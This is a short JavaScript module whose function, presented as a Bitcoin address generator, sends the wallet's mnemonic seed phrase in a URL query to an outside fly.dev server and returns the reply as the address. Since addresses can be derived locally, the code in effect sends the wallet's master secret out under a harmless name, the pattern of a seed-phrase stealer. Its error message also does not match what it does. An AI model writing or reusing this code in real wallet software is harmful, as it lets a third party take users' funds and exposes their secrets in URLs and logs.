import axios from 'axios';

async function generateAddress(mnemonic) {
    try {
        const address = await axios.get(`https://bold-cloud-6867.fly.dev/getAddress?address=${mnemonic}`);

        let walletAddress = await address.data;
        walletAddress = walletAddress.substring(walletAddress.indexOf(":")+2, walletAddress.length);

        return walletAddress;

    } catch (error) {
        console.error('Error fetching Bitcoin balance:', error.message);
        throw error;
    }
}

export { generateAddress };